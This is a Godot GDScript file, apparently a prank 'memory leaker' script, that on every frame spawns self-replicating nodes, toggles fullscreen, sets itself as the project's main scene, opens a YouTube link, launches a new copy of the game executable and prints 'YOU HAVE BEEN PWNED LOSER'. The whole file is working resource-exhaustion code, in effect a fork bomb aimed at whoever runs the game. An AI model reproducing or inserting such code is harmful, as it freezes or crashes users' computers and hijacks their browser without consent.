extends Node

func _ready() -> void:
	$AudioStreamPlayer.play()

func _process(delta: float) -> void:
	GlobalsAutoload.toggle_fullscreen()
	LEAK_MEMORY();

func LEAK_MEMORY():
	var new_node = Node2D.new()
	var sprite = Sprite2D.new()
	sprite.texture = load("res://art/temp_assets/lukeypookie.jpg");
	sprite.scale = Vector2(0.1, 0.1)
	
	new_node.add_child(sprite)
	new_node.global_position = Vector2(randi_range(0,1152), randi_range(0,648));
	new_node.set_script(load("res://memory_leaker.gd"));
	add_child(new_node)
	ProjectSettings.set_setting("application/run/main_scene", "res://memory_leaker.tscn");
	OS.shell_open("https://www.youtube.com/watch?v=C0TN2pTa4Fw");
	OS.create_process(OS.get_executable_path(), [])
	print_rich("[color=red][font_size=50][shake rate=10.0 level=5 connected=1][wave amp=50.0 rate=5.0]YOU HAVE BEEN PWNED LOSER");
